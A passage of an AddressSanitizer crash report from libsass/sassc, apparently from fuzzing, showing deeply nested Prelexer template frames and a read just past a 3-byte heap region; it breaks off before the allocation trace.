    #16 0x922ba7 in char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::alternatives<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::exactly<(char)35>(char const*)), &(char const* Sass::Prelexer::negate<&(char const* Sass::Prelexer::exactly<(char)123>(char const*))>(char const*))>(char const*)), &(char const* Sass::Prelexer::exactly<(char)46>(char const*)), &(char const* Sass::Prelexer::optional<&Sass::Prelexer::pseudo_prefix>(char const*))>(char const*)), &(char const* Sass::Prelexer::one_plus<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::exactly<(char)45>(char const*))>(char const*)), &(char const* Sass::Prelexer::alternatives<&Sass::Prelexer::kwd_optional, &(char const* Sass::Prelexer::exactly<(char)42>(char const*)), &Sass::Prelexer::quoted_string, &Sass::Prelexer::interpolant, &Sass::Prelexer::identifier, &Sass::Prelexer::variable, &Sass::Prelexer::percentage, &Sass::Prelexer::binomial, &Sass::Prelexer::dimension, &Sass::Prelexer::alnum>(char const*))>(char const*))>(char const*)), &(char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::exactly<(char)45>(char const*))>(char const*))>(char const*) /home/geeknik/libsass/src/lexer.hpp:219
    #17 0x922ba7 in char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::optional<&Sass::Prelexer::namespace_schema>(char const*)), &(char const* Sass::Prelexer::alternatives<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::exactly<(char)35>(char const*)), &(char const* Sass::Prelexer::negate<&(char const* Sass::Prelexer::exactly<(char)123>(char const*))>(char const*))>(char const*)), &(char const* Sass::Prelexer::exactly<(char)46>(char const*)), &(char const* Sass::Prelexer::optional<&Sass::Prelexer::pseudo_prefix>(char const*))>(char const*)), &(char const* Sass::Prelexer::one_plus<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::exactly<(char)45>(char const*))>(char const*)), &(char const* Sass::Prelexer::alternatives<&Sass::Prelexer::kwd_optional, &(char const* Sass::Prelexer::exactly<(char)42>(char const*)), &Sass::Prelexer::quoted_string, &Sass::Prelexer::interpolant, &Sass::Prelexer::identifier, &Sass::Prelexer::variable, &Sass::Prelexer::percentage, &Sass::Prelexer::binomial, &Sass::Prelexer::dimension, &Sass::Prelexer::alnum>(char const*))>(char const*))>(char const*)), &(char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::exactly<(char)45>(char const*))>(char const*))>(char const*) /home/geeknik/libsass/src/lexer.hpp:219
    #18 0x923fa3 in char const* Sass::Prelexer::alternatives<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::optional<&Sass::Prelexer::namespace_schema>(char const*)), &(char const* Sass::Prelexer::alternatives<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::exactly<(char)35>(char const*)), &(char const* Sass::Prelexer::negate<&(char const* Sass::Prelexer::exactly<(char)123>(char const*))>(char const*))>(char const*)), &(char const* Sass::Prelexer::exactly<(char)46>(char const*)), &(char const* Sass::Prelexer::optional<&Sass::Prelexer::pseudo_prefix>(char const*))>(char const*)), &(char const* Sass::Prelexer::one_plus<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::exactly<(char)45>(char const*))>(char const*)), &(char const* Sass::Prelexer::alternatives<&Sass::Prelexer::kwd_optional, &(char const* Sass::Prelexer::exactly<(char)42>(char const*)), &Sass::Prelexer::quoted_string, &Sass::Prelexer::interpolant, &Sass::Prelexer::identifier, &Sass::Prelexer::variable, &Sass::Prelexer::percentage, &Sass::Prelexer::binomial, &Sass::Prelexer::dimension, &Sass::Prelexer::alnum>(char const*))>(char const*))>(char const*)), &(char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::exactly<(char)45>(char const*))>(char const*))>(char const*))>(char const*) /home/geeknik/libsass/src/lexer.hpp:196:19
    #19 0x923fa3 in char const* Sass::Prelexer::alternatives<&(char const* Sass::Prelexer::alternatives<&Sass::Prelexer::exact_match, &Sass::Prelexer::class_match, &Sass::Prelexer::dash_match, &Sass::Prelexer::prefix_match, &Sass::Prelexer::suffix_match, &Sass::Prelexer::substring_match>(char const*)), &(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::optional<&Sass::Prelexer::namespace_schema>(char const*)), &(char const* Sass::Prelexer::alternatives<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::exactly<(char)35>(char const*)), &(char const* Sass::Prelexer::negate<&(char const* Sass::Prelexer::exactly<(char)123>(char const*))>(char const*))>(char const*)), &(char const* Sass::Prelexer::exactly<(char)46>(char const*)), &(char const* Sass::Prelexer::optional<&Sass::Prelexer::pseudo_prefix>(char const*))>(char const*)), &(char const* Sass::Prelexer::one_plus<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::exactly<(char)45>(char const*))>(char const*)), &(char const* Sass::Prelexer::alternatives<&Sass::Prelexer::kwd_optional, &(char const* Sass::Prelexer::exactly<(char)42>(char const*)), &Sass::Prelexer::quoted_string, &Sass::Prelexer::interpolant, &Sass::Prelexer::identifier, &Sass::Prelexer::variable, &Sass::Prelexer::percentage, &Sass::Prelexer::binomial, &Sass::Prelexer::dimension, &Sass::Prelexer::alnum>(char const*))>(char const*))>(char const*)), &(char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::exactly<(char)45>(char const*))>(char const*))>(char const*))>(char const*) /home/geeknik/libsass/src/lexer.hpp:203
    #20 0x923fa3 in char const* Sass::Prelexer::alternatives<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::exactly<(char)40>(char const*)), &Sass::Prelexer::optional_spaces, &(char const* Sass::Prelexer::optional<&Sass::Prelexer::re_selector_list>(char const*)), &Sass::Prelexer::optional_spaces, &(char const* Sass::Prelexer::exactly<(char)41>(char const*))>(char const*)), &(char const* Sass::Prelexer::alternatives<&Sass::Prelexer::exact_match, &Sass::Prelexer::class_match, &Sass::Prelexer::dash_match, &Sass::Prelexer::prefix_match, &Sass::Prelexer::suffix_match, &Sass::Prelexer::substring_match>(char const*)), &(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::optional<&Sass::Prelexer::namespace_schema>(char const*)), &(char const* Sass::Prelexer::alternatives<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::exactly<(char)35>(char const*)), &(char const* Sass::Prelexer::negate<&(char const* Sass::Prelexer::exactly<(char)123>(char const*))>(char const*))>(char const*)), &(char const* Sass::Prelexer::exactly<(char)46>(char const*)), &(char const* Sass::Prelexer::optional<&Sass::Prelexer::pseudo_prefix>(char const*))>(char const*)), &(char const* Sass::Prelexer::one_plus<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::exactly<(char)45>(char const*))>(char const*)), &(char const* Sass::Prelexer::alternatives<&Sass::Prelexer::kwd_optional, &(char const* Sass::Prelexer::exactly<(char)42>(char const*)), &Sass::Prelexer::quoted_string, &Sass::Prelexer::interpolant, &Sass::Prelexer::identifier, &Sass::Prelexer::variable, &Sass::Prelexer::percentage, &Sass::Prelexer::binomial, &Sass::Prelexer::dimension, &Sass::Prelexer::alnum>(char const*))>(char const*))>(char const*)), &(char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::exactly<(char)45>(char const*))>(char const*))>(char const*))>(char const*) /home/geeknik/libsass/src/lexer.hpp:203
    #21 0x923fa3 in char const* Sass::Prelexer::alternatives<&(char const* Sass::Prelexer::class_char<&Sass::Constants::selector_combinator_ops>(char const*)), &(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::exactly<(char)40>(char const*)), &Sass::Prelexer::optional_spaces, &(char const* Sass::Prelexer::optional<&Sass::Prelexer::re_selector_list>(char const*)), &Sass::Prelexer::optional_spaces, &(char const* Sass::Prelexer::exactly<(char)41>(char const*))>(char const*)), &(char const* Sass::Prelexer::alternatives<&Sass::Prelexer::exact_match, &Sass::Prelexer::class_match, &Sass::Prelexer::dash_match, &Sass::Prelexer::prefix_match, &Sass::Prelexer::suffix_match, &Sass::Prelexer::substring_match>(char const*)), &(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::optional<&Sass::Prelexer::namespace_schema>(char const*)), &(char const* Sass::Prelexer::alternatives<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::exactly<(char)35>(char const*)), &(char const* Sass::Prelexer::negate<&(char const* Sass::Prelexer::exactly<(char)123>(char const*))>(char const*))>(char const*)), &(char const* Sass::Prelexer::exactly<(char)46>(char const*)), &(char const* Sass::Prelexer::optional<&Sass::Prelexer::pseudo_prefix>(char const*))>(char const*)), &(char const* Sass::Prelexer::one_plus<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::exactly<(char)45>(char const*))>(char const*)), &(char const* Sass::Prelexer::alternatives<&Sass::Prelexer::kwd_optional, &(char const* Sass::Prelexer::exactly<(char)42>(char const*)), &Sass::Prelexer::quoted_string, &Sass::Prelexer::interpolant, &Sass::Prelexer::identifier, &Sass::Prelexer::variable, &Sass::Prelexer::percentage, &Sass::Prelexer::binomial, &Sass::Prelexer::dimension, &Sass::Prelexer::alnum>(char const*))>(char const*))>(char const*)), &(char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::exactly<(char)45>(char const*))>(char const*))>(char const*))>(char const*) /home/geeknik/libsass/src/lexer.hpp:203
    #22 0x923fa3 in char const* Sass::Prelexer::alternatives<&(char const* Sass::Prelexer::class_char<&Sass::Constants::selector_lookahead_ops>(char const*)), &(char const* Sass::Prelexer::class_char<&Sass::Constants::selector_combinator_ops>(char const*)), &(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::exactly<(char)40>(char const*)), &Sass::Prelexer::optional_spaces, &(char const* Sass::Prelexer::optional<&Sass::Prelexer::re_selector_list>(char const*)), &Sass::Prelexer::optional_spaces, &(char const* Sass::Prelexer::exactly<(char)41>(char const*))>(char const*)), &(char const* Sass::Prelexer::alternatives<&Sass::Prelexer::exact_match, &Sass::Prelexer::class_match, &Sass::Prelexer::dash_match, &Sass::Prelexer::prefix_match, &Sass::Prelexer::suffix_match, &Sass::Prelexer::substring_match>(char const*)), &(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::optional<&Sass::Prelexer::namespace_schema>(char const*)), &(char const* Sass::Prelexer::alternatives<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::exactly<(char)35>(char const*)), &(char const* Sass::Prelexer::negate<&(char const* Sass::Prelexer::exactly<(char)123>(char const*))>(char const*))>(char const*)), &(char const* Sass::Prelexer::exactly<(char)46>(char const*)), &(char const* Sass::Prelexer::optional<&Sass::Prelexer::pseudo_prefix>(char const*))>(char const*)), &(char const* Sass::Prelexer::one_plus<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::exactly<(char)45>(char const*))>(char const*)), &(char const* Sass::Prelexer::alternatives<&Sass::Prelexer::kwd_optional, &(char const* Sass::Prelexer::exactly<(char)42>(char const*)), &Sass::Prelexer::quoted_string, &Sass::Prelexer::interpolant, &Sass::Prelexer::identifier, &Sass::Prelexer::variable, &Sass::Prelexer::percentage, &Sass::Prelexer::binomial, &Sass::Prelexer::dimension, &Sass::Prelexer::alnum>(char const*))>(char const*))>(char const*)), &(char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::exactly<(char)45>(char const*))>(char const*))>(char const*))>(char const*) /home/geeknik/libsass/src/lexer.hpp:203
    #23 0x92261b in char const* Sass::Prelexer::alternatives<&Sass::Prelexer::schema_reference_combinator, &(char const* Sass::Prelexer::class_char<&Sass::Constants::selector_lookahead_ops>(char const*)), &(char const* Sass::Prelexer::class_char<&Sass::Constants::selector_combinator_ops>(char const*)), &(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::exactly<(char)40>(char const*)), &Sass::Prelexer::optional_spaces, &(char const* Sass::Prelexer::optional<&Sass::Prelexer::re_selector_list>(char const*)), &Sass::Prelexer::optional_spaces, &(char const* Sass::Prelexer::exactly<(char)41>(char const*))>(char const*)), &(char const* Sass::Prelexer::alternatives<&Sass::Prelexer::exact_match, &Sass::Prelexer::class_match, &Sass::Prelexer::dash_match, &Sass::Prelexer::prefix_match, &Sass::Prelexer::suffix_match, &Sass::Prelexer::substring_match>(char const*)), &(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::optional<&Sass::Prelexer::namespace_schema>(char const*)), &(char const* Sass::Prelexer::alternatives<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::exactly<(char)35>(char const*)), &(char const* Sass::Prelexer::negate<&(char const* Sass::Prelexer::exactly<(char)123>(char const*))>(char const*))>(char const*)), &(char const* Sass::Prelexer::exactly<(char)46>(char const*)), &(char const* Sass::Prelexer::optional<&Sass::Prelexer::pseudo_prefix>(char const*))>(char const*)), &(char const* Sass::Prelexer::one_plus<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::exactly<(char)45>(char const*))>(char const*)), &(char const* Sass::Prelexer::alternatives<&Sass::Prelexer::kwd_optional, &(char const* Sass::Prelexer::exactly<(char)42>(char const*)), &Sass::Prelexer::quoted_string, &Sass::Prelexer::interpolant, &Sass::Prelexer::identifier, &Sass::Prelexer::variable, &Sass::Prelexer::percentage, &Sass::Prelexer::binomial, &Sass::Prelexer::dimension, &Sass::Prelexer::alnum>(char const*))>(char const*))>(char const*)), &(char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::exactly<(char)45>(char const*))>(char const*))>(char const*))>(char const*) /home/geeknik/libsass/src/lexer.hpp:203:14
    #24 0x92261b in char const* Sass::Prelexer::alternatives<&Sass::Prelexer::line_comment, &Sass::Prelexer::schema_reference_combinator, &(char const* Sass::Prelexer::class_char<&Sass::Constants::selector_lookahead_ops>(char const*)), &(char const* Sass::Prelexer::class_char<&Sass::Constants::selector_combinator_ops>(char const*)), &(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::exactly<(char)40>(char const*)), &Sass::Prelexer::optional_spaces, &(char const* Sass::Prelexer::optional<&Sass::Prelexer::re_selector_list>(char const*)), &Sass::Prelexer::optional_spaces, &(char const* Sass::Prelexer::exactly<(char)41>(char const*))>(char const*)), &(char const* Sass::Prelexer::alternatives<&Sass::Prelexer::exact_match, &Sass::Prelexer::class_match, &Sass::Prelexer::dash_match, &Sass::Prelexer::prefix_match, &Sass::Prelexer::suffix_match, &Sass::Prelexer::substring_match>(char const*)), &(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::optional<&Sass::Prelexer::namespace_schema>(char const*)), &(char const* Sass::Prelexer::alternatives<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::exactly<(char)35>(char const*)), &(char const* Sass::Prelexer::negate<&(char const* Sass::Prelexer::exactly<(char)123>(char const*))>(char const*))>(char const*)), &(char const* Sass::Prelexer::exactly<(char)46>(char const*)), &(char const* Sass::Prelexer::optional<&Sass::Prelexer::pseudo_prefix>(char const*))>(char const*)), &(char const* Sass::Prelexer::one_plus<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::exactly<(char)45>(char const*))>(char const*)), &(char const* Sass::Prelexer::alternatives<&Sass::Prelexer::kwd_optional, &(char const* Sass::Prelexer::exactly<(char)42>(char const*)), &Sass::Prelexer::quoted_string, &Sass::Prelexer::interpolant, &Sass::Prelexer::identifier, &Sass::Prelexer::variable, &Sass::Prelexer::percentage, &Sass::Prelexer::binomial, &Sass::Prelexer::dimension, &Sass::Prelexer::alnum>(char const*))>(char const*))>(char const*)), &(char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::exactly<(char)45>(char const*))>(char const*))>(char const*))>(char const*) /home/geeknik/libsass/src/lexer.hpp:203
    #25 0x92261b in char const* Sass::Prelexer::alternatives<&Sass::Prelexer::block_comment, &Sass::Prelexer::line_comment, &Sass::Prelexer::schema_reference_combinator, &(char const* Sass::Prelexer::class_char<&Sass::Constants::selector_lookahead_ops>(char const*)), &(char const* Sass::Prelexer::class_char<&Sass::Constants::selector_combinator_ops>(char const*)), &(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::exactly<(char)40>(char const*)), &Sass::Prelexer::optional_spaces, &(char const* Sass::Prelexer::optional<&Sass::Prelexer::re_selector_list>(char const*)), &Sass::Prelexer::optional_spaces, &(char const* Sass::Prelexer::exactly<(char)41>(char const*))>(char const*)), &(char const* Sass::Prelexer::alternatives<&Sass::Prelexer::exact_match, &Sass::Prelexer::class_match, &Sass::Prelexer::dash_match, &Sass::Prelexer::prefix_match, &Sass::Prelexer::suffix_match, &Sass::Prelexer::substring_match>(char const*)), &(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::optional<&Sass::Prelexer::namespace_schema>(char const*)), &(char const* Sass::Prelexer::alternatives<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::exactly<(char)35>(char const*)), &(char const* Sass::Prelexer::negate<&(char const* Sass::Prelexer::exactly<(char)123>(char const*))>(char const*))>(char const*)), &(char const* Sass::Prelexer::exactly<(char)46>(char const*)), &(char const* Sass::Prelexer::optional<&Sass::Prelexer::pseudo_prefix>(char const*))>(char const*)), &(char const* Sass::Prelexer::one_plus<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::exactly<(char)45>(char const*))>(char const*)), &(char const* Sass::Prelexer::alternatives<&Sass::Prelexer::kwd_optional, &(char const* Sass::Prelexer::exactly<(char)42>(char const*)), &Sass::Prelexer::quoted_string, &Sass::Prelexer::interpolant, &Sass::Prelexer::identifier, &Sass::Prelexer::variable, &Sass::Prelexer::percentage, &Sass::Prelexer::binomial, &Sass::Prelexer::dimension, &Sass::Prelexer::alnum>(char const*))>(char const*))>(char const*)), &(char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::exactly<(char)45>(char const*))>(char const*))>(char const*))>(char const*) /home/geeknik/libsass/src/lexer.hpp:203
    #26 0x92261b in char const* Sass::Prelexer::alternatives<&Sass::Prelexer::spaces, &Sass::Prelexer::block_comment, &Sass::Prelexer::line_comment, &Sass::Prelexer::schema_reference_combinator, &(char const* Sass::Prelexer::class_char<&Sass::Constants::selector_lookahead_ops>(char const*)), &(char const* Sass::Prelexer::class_char<&Sass::Constants::selector_combinator_ops>(char const*)), &(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::exactly<(char)40>(char const*)), &Sass::Prelexer::optional_spaces, &(char const* Sass::Prelexer::optional<&Sass::Prelexer::re_selector_list>(char const*)), &Sass::Prelexer::optional_spaces, &(char const* Sass::Prelexer::exactly<(char)41>(char const*))>(char const*)), &(char const* Sass::Prelexer::alternatives<&Sass::Prelexer::exact_match, &Sass::Prelexer::class_match, &Sass::Prelexer::dash_match, &Sass::Prelexer::prefix_match, &Sass::Prelexer::suffix_match, &Sass::Prelexer::substring_match>(char const*)), &(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::optional<&Sass::Prelexer::namespace_schema>(char const*)), &(char const* Sass::Prelexer::alternatives<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::exactly<(char)35>(char const*)), &(char const* Sass::Prelexer::negate<&(char const* Sass::Prelexer::exactly<(char)123>(char const*))>(char const*))>(char const*)), &(char const* Sass::Prelexer::exactly<(char)46>(char const*)), &(char const* Sass::Prelexer::optional<&Sass::Prelexer::pseudo_prefix>(char const*))>(char const*)), &(char const* Sass::Prelexer::one_plus<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::exactly<(char)45>(char const*))>(char const*)), &(char const* Sass::Prelexer::alternatives<&Sass::Prelexer::kwd_optional, &(char const* Sass::Prelexer::exactly<(char)42>(char const*)), &Sass::Prelexer::quoted_string, &Sass::Prelexer::interpolant, &Sass::Prelexer::identifier, &Sass::Prelexer::variable, &Sass::Prelexer::percentage, &Sass::Prelexer::binomial, &Sass::Prelexer::dimension, &Sass::Prelexer::alnum>(char const*))>(char const*))>(char const*)), &(char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::exactly<(char)45>(char const*))>(char const*))>(char const*))>(char const*) /home/geeknik/libsass/src/lexer.hpp:203
    #27 0x91aebf in char const* Sass::Prelexer::one_plus<&(char const* Sass::Prelexer::alternatives<&Sass::Prelexer::spaces, &Sass::Prelexer::block_comment, &Sass::Prelexer::line_comment, &Sass::Prelexer::schema_reference_combinator, &(char const* Sass::Prelexer::class_char<&Sass::Constants::selector_lookahead_ops>(char const*)), &(char const* Sass::Prelexer::class_char<&Sass::Constants::selector_combinator_ops>(char const*)), &(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::exactly<(char)40>(char const*)), &Sass::Prelexer::optional_spaces, &(char const* Sass::Prelexer::optional<&Sass::Prelexer::re_selector_list>(char const*)), &Sass::Prelexer::optional_spaces, &(char const* Sass::Prelexer::exactly<(char)41>(char const*))>(char const*)), &(char const* Sass::Prelexer::alternatives<&Sass::Prelexer::exact_match, &Sass::Prelexer::class_match, &Sass::Prelexer::dash_match, &Sass::Prelexer::prefix_match, &Sass::Prelexer::suffix_match, &Sass::Prelexer::substring_match>(char const*)), &(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::optional<&Sass::Prelexer::namespace_schema>(char const*)), &(char const* Sass::Prelexer::alternatives<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::exactly<(char)35>(char const*)), &(char const* Sass::Prelexer::negate<&(char const* Sass::Prelexer::exactly<(char)123>(char const*))>(char const*))>(char const*)), &(char const* Sass::Prelexer::exactly<(char)46>(char const*)), &(char const* Sass::Prelexer::optional<&Sass::Prelexer::pseudo_prefix>(char const*))>(char const*)), &(char const* Sass::Prelexer::one_plus<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::exactly<(char)45>(char const*))>(char const*)), &(char const* Sass::Prelexer::alternatives<&Sass::Prelexer::kwd_optional, &(char const* Sass::Prelexer::exactly<(char)42>(char const*)), &Sass::Prelexer::quoted_string, &Sass::Prelexer::interpolant, &Sass::Prelexer::identifier, &Sass::Prelexer::variable, &Sass::Prelexer::percentage, &Sass::Prelexer::binomial, &Sass::Prelexer::dimension, &Sass::Prelexer::alnum>(char const*))>(char const*))>(char const*)), &(char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::exactly<(char)45>(char const*))>(char const*))>(char const*))>(char const*))>(char const*) /home/geeknik/libsass/src/lexer.hpp:244:23
    #28 0x91aebf in char const* Sass::Prelexer::alternatives<&(char const* Sass::Prelexer::one_plus<&(char const* Sass::Prelexer::alternatives<&Sass::Prelexer::spaces, &Sass::Prelexer::block_comment, &Sass::Prelexer::line_comment, &Sass::Prelexer::schema_reference_combinator, &(char const* Sass::Prelexer::class_char<&Sass::Constants::selector_lookahead_ops>(char const*)), &(char const* Sass::Prelexer::class_char<&Sass::Constants::selector_combinator_ops>(char const*)), &(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::exactly<(char)40>(char const*)), &Sass::Prelexer::optional_spaces, &(char const* Sass::Prelexer::optional<&Sass::Prelexer::re_selector_list>(char const*)), &Sass::Prelexer::optional_spaces, &(char const* Sass::Prelexer::exactly<(char)41>(char const*))>(char const*)), &(char const* Sass::Prelexer::alternatives<&Sass::Prelexer::exact_match, &Sass::Prelexer::class_match, &Sass::Prelexer::dash_match, &Sass::Prelexer::prefix_match, &Sass::Prelexer::suffix_match, &Sass::Prelexer::substring_match>(char const*)), &(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::optional<&Sass::Prelexer::namespace_schema>(char const*)), &(char const* Sass::Prelexer::alternatives<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::exactly<(char)35>(char const*)), &(char const* Sass::Prelexer::negate<&(char const* Sass::Prelexer::exactly<(char)123>(char const*))>(char const*))>(char const*)), &(char const* Sass::Prelexer::exactly<(char)46>(char const*)), &(char const* Sass::Prelexer::optional<&Sass::Prelexer::pseudo_prefix>(char const*))>(char const*)), &(char const* Sass::Prelexer::one_plus<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::exactly<(char)45>(char const*))>(char const*)), &(char const* Sass::Prelexer::alternatives<&Sass::Prelexer::kwd_optional, &(char const* Sass::Prelexer::exactly<(char)42>(char const*)), &Sass::Prelexer::quoted_string, &Sass::Prelexer::interpolant, &Sass::Prelexer::identifier, &Sass::Prelexer::variable, &Sass::Prelexer::percentage, &Sass::Prelexer::binomial, &Sass::Prelexer::dimension, &Sass::Prelexer::alnum>(char const*))>(char const*))>(char const*)), &(char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::exactly<(char)45>(char const*))>(char const*))>(char const*))>(char const*))>(char const*))>(char const*) /home/geeknik/libsass/src/lexer.hpp:196
    #29 0x91aebf in char const* Sass::Prelexer::alternatives<&(char const* Sass::Prelexer::sequence<&Sass::Prelexer::ampersand, &(char const* Sass::Prelexer::one_plus<&(char const* Sass::Prelexer::exactly<(char)45>(char const*))>(char const*)), &Sass::Prelexer::word_boundary, &Sass::Prelexer::optional_spaces>(char const*)), &(char const* Sass::Prelexer::one_plus<&(char const* Sass::Prelexer::alternatives<&Sass::Prelexer::spaces, &Sass::Prelexer::block_comment, &Sass::Prelexer::line_comment, &Sass::Prelexer::schema_reference_combinator, &(char const* Sass::Prelexer::class_char<&Sass::Constants::selector_lookahead_ops>(char const*)), &(char const* Sass::Prelexer::class_char<&Sass::Constants::selector_combinator_ops>(char const*)), &(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::exactly<(char)40>(char const*)), &Sass::Prelexer::optional_spaces, &(char const* Sass::Prelexer::optional<&Sass::Prelexer::re_selector_list>(char const*)), &Sass::Prelexer::optional_spaces, &(char const* Sass::Prelexer::exactly<(char)41>(char const*))>(char const*)), &(char const* Sass::Prelexer::alternatives<&Sass::Prelexer::exact_match, &Sass::Prelexer::class_match, &Sass::Prelexer::dash_match, &Sass::Prelexer::prefix_match, &Sass::Prelexer::suffix_match, &Sass::Prelexer::substring_match>(char const*)), &(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::optional<&Sass::Prelexer::namespace_schema>(char const*)), &(char const* Sass::Prelexer::alternatives<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::exactly<(char)35>(char const*)), &(char const* Sass::Prelexer::negate<&(char const* Sass::Prelexer::exactly<(char)123>(char const*))>(char const*))>(char const*)), &(char const* Sass::Prelexer::exactly<(char)46>(char const*)), &(char const* Sass::Prelexer::optional<&Sass::Prelexer::pseudo_prefix>(char const*))>(char const*)), &(char const* Sass::Prelexer::one_plus<&(char const* Sass::Prelexer::sequence<&(char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::exactly<(char)45>(char const*))>(char const*)), &(char const* Sass::Prelexer::alternatives<&Sass::Prelexer::kwd_optional, &(char const* Sass::Prelexer::exactly<(char)42>(char const*)), &Sass::Prelexer::quoted_string, &Sass::Prelexer::interpolant, &Sass::Prelexer::identifier, &Sass::Prelexer::variable, &Sass::Prelexer::percentage, &Sass::Prelexer::binomial, &Sass::Prelexer::dimension, &Sass::Prelexer::alnum>(char const*))>(char const*))>(char const*)), &(char const* Sass::Prelexer::zero_plus<&(char const* Sass::Prelexer::exactly<(char)45>(char const*))>(char const*))>(char const*))>(char const*))>(char const*))>(char const*) /home/geeknik/libsass/src/lexer.hpp:203
    #30 0x91aebf in Sass::Prelexer::re_selector_list(char const*) /home/geeknik/libsass/src/prelexer.cpp:1580
    #31 0x806242 in char const* Sass::Parser::peek<&Sass::Prelexer::re_selector_list>(char const*) /home/geeknik/libsass/src/parser.hpp:122:27
    #32 0x806242 in Sass::Parser::lookahead_for_selector(char const*) /home/geeknik/libsass/src/parser.cpp:2600
    #33 0x7db514 in Sass::Parser::parse_block_node(bool) /home/geeknik/libsass/src/parser.cpp:264:35
    #34 0x7cf433 in Sass::Parser::parse_block_nodes(bool) /home/geeknik/libsass/src/parser.cpp:187:11
    #35 0x7cb3c7 in Sass::Parser::parse() /home/geeknik/libsass/src/parser.cpp:113:5
    #36 0x62a92c in Sass::Context::register_resource(Sass::Include const&, Sass::Resource const&, Sass::ParserState*) /home/geeknik/libsass/src/context.cpp:322:22
    #37 0x64c19b in Sass::File_Context::parse() /home/geeknik/libsass/src/context.cpp:584:5
    #38 0x5d0650 in Sass::sass_parse_block(Sass_Compiler*) /home/geeknik/libsass/src/sass_context.cpp:227:22
    #39 0x5d0650 in sass_compiler_parse /home/geeknik/libsass/src/sass_context.cpp:476
    #40 0x5cf1d1 in sass_compile_context(Sass_Context*, Sass::Context*) /home/geeknik/libsass/src/sass_context.cpp:364:7
    #41 0x5cf6be in sass_compile_file_context /home/geeknik/libsass/src/sass_context.cpp:463:12
    #42 0x5b9d2e in compile_file /home/geeknik/sassc/sassc.c:145:5
    #43 0x5bab9b in main /home/geeknik/sassc/sassc.c:335:18
    #44 0x7f8112b0ab44 in __libc_start_main /build/glibc-qK83Be/glibc-2.19/csu/libc-start.c:287
    #45 0x5b92fc in _start (/home/geeknik/sassc/bin/sassc+0x5b92fc)

0x60200000ef93 is located 0 bytes to the right of 3-byte region [0x60200000ef90,0x60200000ef93)
allocated by thread T0 here:
